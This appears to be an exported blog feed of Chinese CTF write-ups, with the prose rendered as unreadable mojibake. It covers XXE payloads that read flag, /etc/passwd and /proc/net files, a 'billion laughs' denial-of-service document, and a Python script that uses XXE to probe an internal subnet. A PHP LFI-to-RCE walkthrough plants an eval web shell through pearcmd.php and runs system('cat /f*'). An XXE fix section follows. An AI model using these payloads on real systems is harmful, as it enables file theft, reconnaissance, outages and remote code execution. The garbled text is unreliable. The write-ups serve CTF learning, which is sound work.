class="line">%name;</span><br><span class="line">]&gt;</span><br><span class="line">//æ³¨æ„ï¼š%nameï¼ˆå‚æ•°å®ä½“ï¼‰æ˜¯åœ¨ DTD ä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&amp;nameï¼ˆå…¶ä½™å®ä½“ï¼‰å®åœ¨ xml æ–‡æ¡£ä¸­è¢«å¼•ç”¨</span><br><span class="line">çš„ã€‚</span><br></pre></td></tr></table></figure><h4 id="ç»•è¿‡æ‰‹æ³•"><a href="#ç»•è¿‡æ‰‹æ³•" class="headerlink" title="ç»•è¿‡æ‰‹æ³•"></a>ç»•è¿‡æ‰‹æ³•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">åŒé‡å®ä½“ç¼–ç ç»•è¿‡</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;!DOCTYPE GVI [  </span><br><span class="line">  </span><br><span class="line">    &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;  </span><br><span class="line">  </span><br><span class="line">    %xml;</span><br><span class="line"></span><br><span class="line">ç¼–ç å†…å®¹:</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;  </span><br><span class="line">&lt;core&gt;  </span><br><span class="line">      &lt;message&gt;&amp;xxe;&lt;/message&gt;  </span><br><span class="line">&lt;/core&gt;</span><br></pre></td></tr></table></figure><h4 id="æ‹’ç»æœåŠ¡æ”»å‡»ä»£ç "><a href="#æ‹’ç»æœåŠ¡æ”»å‡»ä»£ç " class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»ä»£ç "></a>æ‹’ç»æœåŠ¡æ”»å‡»ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [ </span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt; </span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br><span class="line">&lt;--XMLè§£æå™¨å°è¯•è§£æè¯¥æ–‡ä»¶æ—¶ï¼Œç”±äºDTDçš„å®šä¹‰æŒ‡æ•°çº§å±•å¼€ï¼ˆå³é€’å½’å¼•ç”¨),ä¸¾ä¸ªä¾‹å­ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªlolçš„å®ä½“ï¼Œå®ä½“è¿˜æœ‰â€œlolâ€çš„å­—ç¬¦ä¸²ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªlol2çš„å®ä½“ï¼Œé‡Œé¢æœ‰10ä¸ª&quot;lol&quot;çš„å­—ç¬¦ä¸²ï¼Œä¾æ¬¡é€’æ¨ï¼Œä¸€ä¸ªlol3å®ä½“å¼•ç”¨10ä¸ªlol2å®ä½“ï¼Œè¿™æ ·çš„è¯å¯ä»¥ä¸€ç›´å‘æœåŠ¡å™¨ä¼ è¾“æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å½¢æˆäº†DOSæ”»å‡»ï¼Œç»è¿‡XMLè§£æå™¨è§£æåçš„å†…å­˜å ç”¨ä¼šæ¯”å…¶æœ¬èº«å¤§çš„å¤šã€‚--&gt;</span><br></pre></td></tr></table></figure><h3 id="å†…ç½‘æ‰«æ"><a href="#å†…ç½‘æ‰«æ" class="headerlink" title="å†…ç½‘æ‰«æ"></a>å†…ç½‘æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file://proc/net/fib_trie&quot;&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe&lt;/user&gt;</span><br><span class="line">]&gt;</span><br><span class="line">file:///etc/hosts å‚¨å­˜åŸŸåè§£æçš„ç¼“å­˜</span><br><span class="line"></span><br><span class="line">file:///proc/net/arp arpè¡¨ï¼Œå¯ä»¥è·å¾—å†…ç½‘å…¶ä»–æœºå™¨çš„åœ°å€</span><br><span class="line"></span><br><span class="line">file:///proc/net/tcp</span><br><span class="line"></span><br><span class="line">file:///proc/net/udp</span><br><span class="line"></span><br><span class="line">file:///proc/net/dev</span><br><span class="line"></span><br><span class="line">file:///proc/net/fib_trie è·¯ç”±ç¼“å­˜</span><br><span class="line"></span><br><span class="line">file:///etc/passwd ç”¨æˆ·å¯†ç </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å†…ç½‘æ‰«æè„šæœ¬ï¼ˆå€Ÿç”¨å¤§ä½¬çš„è„šæœ¬ï¼‰"><a href="#å†…ç½‘æ‰«æè„šæœ¬ï¼ˆå€Ÿç”¨å¤§ä½¬çš„è„šæœ¬ï¼‰" class="headerlink" title="å†…ç½‘æ‰«æè„šæœ¬ï¼ˆå€Ÿç”¨å¤§ä½¬çš„è„šæœ¬ï¼‰"></a>å†…ç½‘æ‰«æè„šæœ¬ï¼ˆå€Ÿç”¨<a href="https://www.cnblogs.com/Article-kelp/p/16026652.html">å¤§ä½¬çš„è„šæœ¬</a>ï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line">url=<span class="string">&quot;http://185729a2-949c-44fb-ac39-c16282525e73.node5.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE note [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;123&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">xxeä¿®å¤</span><br><span class="line"></span><br><span class="line">æ–¹æ¡ˆï¼šä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</span><br><span class="line"></span><br><span class="line">1.PHPï¼š</span><br><span class="line">libxml\_disable\_entity\_loader(true);//è®¾ç½®ä¸ºtrueæ—¶ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“</span><br><span class="line"></span><br><span class="line">2.JAVA:</span><br><span class="line">DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">3.Pythonï¼š</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData=etree.parse(xmlSource,etree.XMLParser(resolve\_entities=False))</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://www.cnblogs.com/happystudyhuan/p/11774626.html">XXEæ¼æ´-å†ç®€å•ä¸€ç‚¹ç‚¹</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69">æœªçŸ¥æ”»ç„‰çŸ¥é˜²â€”â€”XXEæ¼æ´æ”»é˜²</a></p><p><a href="https://blog.51cto.com/u_13953961/3107472">XXEå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´â€”â€”PHP</a></p><p><a href="https://blog.csdn.net/weixin_26750831/article/details/115201337?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172050770116800211510330%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172050770116800211510330&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-115201337-null-null.142%5Ev100%5Epc_search_result_base2&utm_term=php%20xxe&spm=1018.2226.3001.4187">php xxeæ³¨å…¥,XXEçš„åŸç†åˆ©ç”¨æ–¹å¼åŠä¿®å¤</a></p><p><a href="https://blog.csdn.net/logic1001/article/details/136590382?ops_request_misc=&request_id=&biz_id=102&utm_term=php%20xxe&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-136590382.142%5Ev100%5Epc_search_result_base2&spm=1018.2226.3001.4187">æ¸—é€æ”»å‡»é›¶åŸºç¡€å­¦ä¹ -XXEï¼ˆéå¸¸è¯¦ç»†ï¼‰é›¶åŸºç¡€å…¥é—¨åˆ°ç²¾é€šï¼Œæ”¶è—è¿™ä¸€ç¯‡å°±å¤Ÿäº†ï¼ï¼ï¼</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/16026652.html">BUUCTFé¢˜è§£ NCTF2019 True XML cookbookâ€“Article</a></p><p><a href="https://peekaboo.show/untitled-7/">[NCTF2019]True XML cookbook 1-peekaboo</a></p><p><a href="https://blog.csdn.net/weixin_43221560/article/details/108152738">XXEæ¼æ´-å†…ç½‘æ¢æµ‹</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ--LFI to RCE</title>
      <link href="/2024/07/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90-LFI-to-RCE/"/>
      <url>/2024/07/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90-LFI-to-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</h1><p>ä¸Šæ¥çœ‹åˆ°æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä¼ ä¸€ä¸ªphpinfoçœ‹çœ‹æ˜¯ä»€ä¹ˆ</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101549638.png" alt="img"></p><p>ä¸€ä¸ªå‡çš„flagï¼Œä¸è¿‡è¿™æ˜¯ä¸ªæç¤ºï¼Œé‚£æˆ‘ä»¬çœ‹ä¸€ä¸‹register_argc_argvæ˜¯ä»€ä¹ˆç©æ„</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101552331.png" alt="img"></p><p>å¼€å¯çŠ¶æ€ï¼Œé‚£æˆ‘å°±å¾—æŸ¥æŸ¥èµ„æ–™äº†ï¼Œè¿™ä¸ªregister_argc_argvçš„ä½œç”¨</p><p>ç›´æ¥æ”¾æ–‡ç« é“¾æ¥ï¼š<a href="https://cloud.tencent.com/developer/article/2204400">https://cloud.tencent.com/developer/article/2204400</a>     <a href="https://www.cnblogs.com/Yu--/p/15788689.html">https://www.cnblogs.com/Yu--/p/15788689.html</a>      <a href="https://blog.csdn.net/weixin_53090346/article/details/127241278">https://blog.csdn.net/weixin_53090346/article/details/127241278</a></p><p>è¿™ä¸ªä¸»è¦æ˜¯ç”¨çš„æ˜¯åŒ…å«pearcmd.phpè¿™ä¸ªæ–‡ä»¶æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç„¶åå€Ÿç”¨å¤§ä½¬çš„å›¾å“ˆ</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101557767.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªconfig-createå‚æ•°ï¼Œè¿™ä¸ªå°±æ˜¯å»åˆ›å»ºæ–‡ä»¶çš„å‘½ä»¤ï¼Œä¸è¿‡è¦ç”¨+æ¥éš”å¼€ï¼ˆåº•å±‚åŸå› ï¼š<a href="https://xz.aliyun.com/t/11089?time__1311=Cq0x2Qi=omq7qGNDQieiKO+mjowcGAbD#toc-0%EF%BC%89">https://xz.aliyun.com/t/11089?time__1311=Cq0x2Qi%3Domq7qGNDQieiKO%2BmjowcGAbD#toc-0ï¼‰</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ‰€ä»¥ï¼Œæ„é€ æˆ‘ä»¬çš„payload</span><br><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/<span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])<span class="meta">?&gt;</span>+./a.php</span><br><span class="line">ä¸åŒçš„ç³»ç»Ÿpearcmdå­˜æ”¾çš„ä½ç½®å¥½åƒä¸ä¸€å®šï¼Œ æœ‰çš„åœ¨/usr/share/php/pearcmd.phpã€‚</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101614305.png" alt="img"></p><p>æ³¨æ„ï¼šç”¨BPè¿›è¡Œæ“ä½œï¼Œä¸ç„¶åœ¨æµè§ˆå™¨ä¸­&lt;&gt;å°±ä¼šè¢«URLç¼–ç ï¼Œå°±ä¼šå¯¼è‡´æˆ‘ä»¬çš„é©¬ä¸ç®¡ç”¨äº†</p><p>ç„¶åï¼ŒPOSTä¼ å…¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=./a</span><br><span class="line">POST:a=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101621878.png" alt="img"></p><p>æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯LFIæ–‡ä»¶åŒ…å«å’ŒRCEçš„ç»“åˆï¼Œå…³é”®ç‚¹æ˜¯åœ¨pearcmd.phpä¸Šï¼Œä¸è¿‡è¿™ç§ä½¿ç”¨æ–¹æ³•åªèƒ½æ˜¯register_argc_argvå¼€å¯çŠ¶æ€æ‰è¡Œã€‚ä¸è¿‡å¦‚æœå¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„è¯ï¼Œå¯ä»¥è¿›è¡Œä¸Šä¼ å®¹å™¨é…ç½®æ–‡ä»¶æ¥æ”¹å˜å…³é—­çŠ¶æ€ï¼ˆå‚è€ƒï¼š<a href="https://cloud.tencent.com/developer/article/2204400%EF%BC%89">https://cloud.tencent.com/developer/article/2204400ï¼‰</a></p><p>å½“ç„¶ï¼ŒLFIå¯ä»¥åšçš„äº‹è¿˜å¾ˆå¤šæ¯”å¦‚è¿˜å¯ä»¥ææƒï¼ˆå‚è€ƒæ–‡ç« :<a href="https://www.freebuf.com/articles/web/253102.html%EF%BC%89">https://www.freebuf.com/articles/web/253102.htmlï¼‰</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> LFI </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme WP</title>
      <link href="/2024/06/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme-WP/"/>
      <url>/2024/06/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp4-Rceme"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp4-Rceme" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme</h1><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042050251.png" alt="img"></p><p>è¿›å…¥é¢˜ç›®ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯å¦‚æœcodeçš„md5å€¼å‰5ä½æ˜¯3e16bï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œå‘½ä»¤</p><p>è¿™è¾¹ç»™å‡ºä¸€ä¸ªmd5ç”Ÿæˆè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">&#x27;0e788&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æç¤º</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051889.png" alt="img"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">vim swpï¼Œ.swpæ–‡ä»¶æ˜¯vimä½¿ç”¨ä¸å½“è€Œç”Ÿæˆçš„ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ç§æ–‡ä»¶ä¸€èˆ¬éƒ½æ˜¯â€œåçš„â€ï¼ŒæŸ¥çœ‹åŸæ¥å†…å®¹éœ€è¦vim -r</span><br><span class="line">è¦ç›´æ¥ç”¨ Vim æ‰“å¼€ä¸€ä¸ª .swp æ–‡ä»¶ï¼Œä½ å¯ä»¥é‡‡å–ä»¥ä¸‹æ­¥éª¤ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ.swp æ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç›´æ¥ç¼–è¾‘å®ƒå¹¶ä¸å¸¸è§ï¼Œä½†ä½ å¯èƒ½ä¼šå¸Œæœ›æŸ¥çœ‹å…¶å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">1. æ‰“å¼€ .swp æ–‡ä»¶</span><br><span class="line">ä½ å¯ä»¥ç”¨ vim å‘½ä»¤ç›´æ¥æ‰“å¼€ .swp æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š</span><br><span class="line">vim example.txt.swp</span><br><span class="line"></span><br><span class="line">2. ä½¿ç”¨ :recover å‘½ä»¤æ¢å¤æ–‡ä»¶</span><br><span class="line">å¦‚æœä½ çš„ç›®çš„æ˜¯ä»äº¤æ¢æ–‡ä»¶ä¸­æ¢å¤æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ :recover å‘½ä»¤ã€‚å‡è®¾ä½ æœ‰ä¸€ä¸ªäº¤æ¢æ–‡ä»¶ example.txt.swpï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š</span><br><span class="line">vim -r example.txt</span><br><span class="line"></span><br><span class="line">3. æ‰‹åŠ¨æ‰“å¼€ .swp æ–‡ä»¶æŸ¥çœ‹å†…å®¹</span><br><span class="line">å¦‚æœä½ 